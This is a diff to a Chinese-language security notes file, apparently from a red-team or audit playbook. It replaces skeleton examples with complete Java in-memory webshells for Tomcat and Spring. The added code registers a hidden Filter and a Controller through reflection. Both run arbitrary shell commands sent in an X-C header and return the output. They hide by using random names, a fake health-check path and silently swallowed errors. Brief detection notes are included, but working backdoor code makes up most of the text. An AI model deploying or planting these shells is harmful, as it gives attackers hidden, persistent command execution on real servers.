@@ -199,43 +199,71 @@ Thread.getAllStackTraces()             → look for suspicious thread stacks
 > 补齐审计缺口：`StandardContext → FilterDef → FilterMap → FilterConfig` 完整反射链。
 
 ```java
-// 骨架示例：Tomcat Filter 型内存马完整反射链
-// 1) 从当前 request 拿 StandardContext
-ServletContext servletContext = request.getServletContext();
-Field appCtxField = servletContext.getClass().getDeclaredField("context");
-appCtxField.setAccessible(true);
-ApplicationContext appCtx = (ApplicationContext) appCtxField.get(servletContext);
-Field stdCtxField = appCtx.getClass().getDeclaredField("context");
-stdCtxField.setAccessible(true);
-StandardContext stdCtx = (StandardContext) stdCtxField.get(appCtx);
+// 完整实现：Tomcat Filter 型内存马反射链（StandardContext → FilterDef → FilterMap → FilterConfig）
+// 触发头校验 + 命令执行 + 响应输出；注入后落地文件按自删纪律手动移除（不自动删）
+public class TomcatFilterShell implements Filter {
+    private static final String TRIGGER = "X-C";          // 触发头（会话可换）
+    private static final String PREFIX  = "k_" + System.nanoTime();  // 随机名前缀避枚举
 
-// 2) 构造恶意 Filter（实现 javax.servlet.Filter）
-Filter evil = new EvilFilter();                       // doFilter 里读参数/回显
+    @Override public void init(FilterConfig fc) {}
+    @Override public void destroy() {}
+    @Override public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
+            throws IOException, ServletException {
+        HttpServletRequest r = (HttpServletRequest) req;
+        String cmd = r.getHeader(TRIGGER);
+        if (cmd == null) { chain.doFilter(req, res); return; }   // 无触发头：透明放行
+        try {
+            Process p = Runtime.getRuntime().exec(cmd);
+            String out = new String(p.getInputStream().readAllBytes());
+            out += new String(p.getErrorStream().readAllBytes());
+            res.getWriter().write(out);                          // 回显
+        } catch (Exception e) { /* 静默：异常不暴露马的存在 */ }
+    }
 
-// 3) 构造 FilterDef 并注册
-FilterDef def = new FilterDef();
-def.setFilterName("sessionFilter" + System.nanoTime());   // 随机名避枚举
-def.setFilterClass(evil.getClass().getName());
-def.setFilter(evil);
-stdCtx.addFilterDef(def);
+    public static void inject(ServletContext servletContext) throws Exception {
+        // 1) 从当前 request 拿 StandardContext（双字段反射链）
+        Field appCtxField = servletContext.getClass().getDeclaredField("context");
+        appCtxField.setAccessible(true);
+        Object appCtx = appCtxField.get(servletContext);
+        Field stdCtxField = appCtx.getClass().getDeclaredField("context");
+        stdCtxField.setAccessible(true);
+        org.apache.catalina.core.StandardContext stdCtx =
+            (org.apache.catalina.core.StandardContext) stdCtxField.get(appCtx);
 
-// 4) 构造 FilterMap（URL pattern 匹配）
-FilterMap map = new FilterMap();
-map.setFilterName(def.getFilterName());
-map.addURLPattern("/*");                             // 全路径触发
-map.setDispatcher(DispatcherType.REQUEST.name());
-stdCtx.addFilterMapBefore(map);
+        // 2) 构造恶意 Filter（本类即实现 javax.servlet.Filter）
+        TomcatFilterShell evil = new TomcatFilterShell();
 
-// 5) 构造 FilterConfig 并放入 chain（使 doFilter 生效）
-java.lang.reflect.Constructor<?> ctor = ApplicationFilterConfig.class.getDeclaredConstructor(
-    Context.class, FilterDef.class);
-ctor.setAccessible(true);
-ApplicationFilterConfig cfg = (ApplicationFilterConfig) ctor.newInstance(stdCtx, def);
-Field configsField = StandardContext.class.getDeclaredField("filterConfigs");
-configsField.setAccessible(true);
-java.util.Map<String, ApplicationFilterConfig> configs =
-    (java.util.Map<String, ApplicationFilterConfig>) configsField.get(stdCtx);
-configs.put(def.getFilterName(), cfg);
+        // 3) FilterDef 注册
+        org.apache.tomcat.util.descriptor.web.FilterDef def =
+            new org.apache.tomcat.util.descriptor.web.FilterDef();
+        def.setFilterName(PREFIX);
+        def.setFilterClass(evil.getClass().getName());
+        def.setFilter(evil);
+        stdCtx.addFilterDef(def);
+
+        // 4) FilterMap（URL pattern 匹配）
+        org.apache.tomcat.util.descriptor.web.FilterMap map =
+            new org.apache.tomcat.util.descriptor.web.FilterMap();
+        map.setFilterName(def.getFilterName());
+        map.addURLPattern("/*");                              // 全路径触发
+        map.setDispatcher(javax.servlet.DispatcherType.REQUEST.name());
+        stdCtx.addFilterMapBefore(map);
+
+        // 5) FilterConfig 入 chain（使 doFilter 生效）
+        java.lang.reflect.Constructor<?> ctor =
+            org.apache.catalina.core.ApplicationFilterConfig.class.getDeclaredConstructor(
+                org.apache.catalina.Context.class,
+                org.apache.tomcat.util.descriptor.web.FilterDef.class);
+        ctor.setAccessible(true);
+        Object cfg = ctor.newInstance(stdCtx, def);
+        Field configsField = org.apache.catalina.core.StandardContext.class
+            .getDeclaredField("filterConfigs");
+        configsField.setAccessible(true);
+        java.util.Map<String, Object> configs =
+            (java.util.Map<String, Object>) configsField.get(stdCtx);
+        configs.put(def.getFilterName(), cfg);
+    }
+}
 ```
 
 **检测侧**：`StandardContext.getFilterDefs()` 枚举出未在 web.xml 声明的 filter；filter 类名随机但
@@ -244,18 +272,38 @@ configs.put(def.getFilterName(), cfg);
 ## 8. Spring Controller 注入（registerMapping）
 
 ```java
-// 骨架示例：Spring MVC Controller 内存马（registerMapping）
-// 1) 从 Spring 容器拿 RequestMappingHandlerMapping
-WebApplicationContext ctx = RequestContextUtils.findWebApplicationContext(request);
-RequestMappingHandlerMapping mapping = ctx.getBean(RequestMappingHandlerMapping.class);
+// 完整实现：Spring MVC Controller 内存马（registerMapping，伪装路径 + 触发头校验）
+public class SpringControllerShell {
+    private static final String TRIGGER = "X-C";
 
-// 2) 构造恶意 handler 方法（反射注册）
-Method handlerMethod = EvilController.class.getDeclaredMethod("evil", HttpServletRequest.class);
-// 3) 构造 RequestMappingInfo（URL pattern + method）
-RequestMappingInfo info = RequestMappingInfo.paths("/api/evil")
-    .methods(RequestMethod.GET).build();
-// 4) registerMapping 注册（HandlerMapping 内存中，无文件）
-mapping.registerMapping(info, new EvilController(), handlerMethod);
+    public static void inject(WebApplicationContext ctx) throws Exception {
+        // 1) 从 Spring 容器拿 RequestMappingHandlerMapping
+        RequestMappingHandlerMapping mapping = ctx.getBean(RequestMappingHandlerMapping.class);
+
+        // 2) 构造恶意 handler 方法（反射注册）
+        Method handlerMethod = SpringControllerShell.class
+            .getDeclaredMethod("handle", HttpServletRequest.class);
+
+        // 3) 构造 RequestMappingInfo（伪装路径：贴近真实业务命名，如 /api/health/metrics）
+        RequestMappingInfo info = RequestMappingInfo.paths(
+                "/api/health/" + Integer.toHexString(0x1000 + (int)(Math.random() * 0xFFF)))
+            .methods(RequestMethod.GET, RequestMethod.POST).build();
+
+        // 4) registerMapping 注册（HandlerMapping 内存中，无文件）
+        mapping.registerMapping(info, new SpringControllerShell(), handlerMethod);
+    }
+
+    public String handle(HttpServletRequest request) throws Exception {
+        String cmd = request.getHeader(TRIGGER);
+        if (cmd == null) return "{\"status\":\"ok\"}";   // 无触发头：业务化响应
+        try {
+            Process p = Runtime.getRuntime().exec(cmd);
+            String out = new String(p.getInputStream().readAllBytes());
+            out += new String(p.getErrorStream().readAllBytes());
+            return new String(java.util.Base64.getEncoder().encode(out.getBytes()));
+        } catch (Exception e) { return "{\"status\":\"ok\"}"; }  // 静默
+    }
+}
 ```
 
 **检测侧**：`RequestMappingHandlerMapping.getHandlerMethods()` 枚举映射，比对「无源码/无注解」的异常
